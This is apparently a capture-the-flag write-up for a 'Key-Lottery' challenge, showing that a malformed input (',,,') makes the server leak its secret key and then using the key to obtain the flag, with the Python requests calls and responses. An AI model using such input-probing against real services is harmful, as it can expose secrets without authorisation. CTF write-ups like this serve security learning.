# Key-Lottery

## Writeup

We are given a server that asks us to guess a random string of length 32. If supply it a empty list that wouldn't throw an error during parsing before being converted to a set like ',,,', it will print us key_set, that wasn't reasigned yet and that containts the random string we were looking for.

```python
In [1]: import requests

In [2]: print(requests.post("http://key-lottery.challs.m0lecon.it/guess", data={"keys" : ",,,"}).text)
got empty key set: {'p1c4XEM2yDQwzCjtYco2tj6toB1A2KXT'}

In [3]: print(requests.post("http://key-lottery.challs.m0lecon.it/guess", data={"keys" : "p1c4XEM2yDQwzCjtYco2tj6toB1A2KXT"}).text)
{"p1c4XEM2yDQwzCjtYco2tj6toB1A2KXT":"ptm{u_guessed_it_alright_mate}"}
```

## flag
ptm{u_guessed_it_alright_mate}
